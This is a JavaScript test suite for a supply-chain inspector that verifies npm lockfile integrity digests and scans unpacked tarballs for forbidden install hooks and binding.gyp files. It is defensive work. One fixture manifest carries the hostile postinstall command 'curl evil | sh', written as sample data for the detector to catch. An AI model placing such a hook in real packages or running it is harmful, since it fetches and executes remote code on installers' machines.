// Tests for the T-009 supply-chain inspector (plan §3).
//
// The two fixtures the plan names, each proving a check can FAIL:
//   * a real nested tarball carrying a forbidden hook — a synthetic violations object would
//     prove the predicate, not that fetch-and-unpack actually reaches and reads packages;
//   * a corrupted integrity digest — rejected before unpacking, or verification is decoration.

import { execFileSync, spawnSync } from "node:child_process";
import { mkdtempSync, mkdirSync, writeFileSync, rmSync, chmodSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createHash } from "node:crypto";
import test from "node:test";
import assert from "node:assert/strict";

import {
  lockEntries,
  verifyIntegrity,
  inspectUnpacked,
  inspectClosure,
  FORBIDDEN_SCRIPTS,
} from "./supply-chain.mjs";

async function withTempDir(fn) {
  // Async-aware: with a plain `return fn(dir)` the finally would delete the fixture while an
  // async callback is still using it — the callbacks here only survived that by finishing
  // their fixture reads before their first await, which is not a property to lean on.
  const dir = mkdtempSync(join(tmpdir(), "supply-fixture-"));
  chmodSync(dir, 0o700);
  try {
    return await fn(dir);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

/** A real gzipped tarball with `package/package.json` (+ optional binding.gyp), built by tar. */
function buildTarball(dir, manifest, { bindingGyp = false } = {}) {
  const stage = join(dir, "stage");
  mkdirSync(join(stage, "package"), { recursive: true });
  writeFileSync(join(stage, "package", "package.json"), JSON.stringify(manifest));
  if (bindingGyp) writeFileSync(join(stage, "package", "binding.gyp"), "{}");
  const out = join(dir, "pkg.tgz");
  const t = spawnSync("tar", ["-czf", out, "-C", stage, "package"], { encoding: "utf8" });
  assert.equal(t.status, 0, t.stderr);
  return readFileSync(out);
}

const integrityOf = (buf) => `sha512-${createHash("sha512").update(buf).digest("base64")}`;

/** A minimal v3 lockfile whose single dependency is served by the injected fetcher. */
function buildLockfile(dir, { integrity }) {
  const p = join(dir, "package-lock.json");
  writeFileSync(
    p,
    JSON.stringify({
      lockfileVersion: 3,
      packages: {
        "": { name: "fixture-workspace" },
        "node_modules/evil-dep": {
          version: "1.0.0",
          resolved: "https://registry.invalid/evil-dep/-/evil-dep-1.0.0.tgz",
          integrity,
        },
      },
    }),
  );
  return p;
}

test("a fetched tarball carrying a forbidden hook is caught from its real bytes", async () => {
  await withTempDir(async (dir) => {
    const tarball = buildTarball(dir, {
      name: "evil-dep",
      version: "1.0.0",
      scripts: { postinstall: "curl evil | sh" },
    });
    const lock = buildLockfile(dir, { integrity: integrityOf(tarball) });
    const r = await inspectClosure(lock, { fetchTarball: async () => tarball });
    assert.deepEqual(r.violations, [{ package: "evil-dep@1.0.0", kind: "script:postinstall" }]);
  });
});

test("binding.gyp is found in the tarball even when the manifest is silent", async () => {
  // The reason fetch-and-unpack exists at all: binding.gyp is a tarball file, not manifest
  // metadata, so `npm view` and `pack --dry-run` cannot see it.
  await withTempDir(async (dir) => {
    const tarball = buildTarball(dir, { name: "evil-dep", version: "1.0.0" }, { bindingGyp: true });
    const lock = buildLockfile(dir, { integrity: integrityOf(tarball) });
    const r = await inspectClosure(lock, { fetchTarball: async () => tarball });
    assert.deepEqual(r.violations, [{ package: "evil-dep@1.0.0", kind: "binding.gyp" }]);
  });
});

test("a corrupted integrity digest is rejected before unpacking", async () => {
  await withTempDir(async (dir) => {
    const tarball = buildTarball(dir, { name: "evil-dep", version: "1.0.0" });
    const wrong = integrityOf(Buffer.concat([tarball, Buffer.from([0x00])]));
    const lock = buildLockfile(dir, { integrity: wrong });
    await assert.rejects(
      () => inspectClosure(lock, { fetchTarball: async () => tarball }),
      /integrity mismatch for evil-dep@1\.0\.0/,
    );
  });
});

test("a lockfile entry without resolved+integrity refuses instead of skipping", async () => {
  await withTempDir((dir) => {
    const p = join(dir, "package-lock.json");
    writeFileSync(
      p,
      JSON.stringify({
        lockfileVersion: 3,
        packages: { "": {}, "node_modules/x": { version: "1.0.0" } },
      }),
    );
    assert.throws(() => lockEntries(p), /cannot verify/);
  });
});

test("an unpacked package with no manifest is a violation, not a skip", async () => {
  await withTempDir((dir) => {
    mkdirSync(join(dir, "package"));
    assert.deepEqual(inspectUnpacked(dir, "x@1"), [{ package: "x@1", kind: "missing-manifest" }]);
  });
});

test("verifyIntegrity distinguishes matching from non-matching bytes", () => {
  const buf = Buffer.from("content");
  assert.equal(verifyIntegrity(buf, integrityOf(buf)), true);
  assert.equal(verifyIntegrity(Buffer.from("tampered"), integrityOf(buf)), false);
  assert.throws(() => verifyIntegrity(buf, "md5-nope"), /unsupported/);
});

test("the real candidate lockfiles resolve, and every entry carries integrity", () => {
  // Non-vacuity against the real workspaces: the closure sizes are the measured facts the
  // decision document reports (v1's stdio-only need pulls a web stack; v2 pulls two packages).
  const HERE = join(process.cwd(), "spikes", "mcp");
  const v1 = lockEntries(join(HERE, "candidates", "v1", "package-lock.json"));
  const v2 = lockEntries(join(HERE, "candidates", "v2", "package-lock.json"));
  assert.ok(v1.length > 50, `v1 closure unexpectedly small: ${v1.length}`);
  assert.ok(v2.length <= 5, `v2 closure unexpectedly large: ${v2.length}`);
  for (const e of [...v1, ...v2]) assert.match(e.integrity, /^sha(512|256|1)-/);
});

test("every forbidden hook name is individually detected", async () => {
  // The list is small; check each member so a future edit dropping one fails here.
  for (const hook of FORBIDDEN_SCRIPTS) {
    await withTempDir((dir) => {
      mkdirSync(join(dir, "package"));
      writeFileSync(
        join(dir, "package", "package.json"),
        JSON.stringify({ name: "h", version: "1.0.0", scripts: { [hook]: "x" } }),
      );
      assert.deepEqual(inspectUnpacked(dir, "h@1"), [{ package: "h@1", kind: `script:${hook}` }]);
    });
  }
});
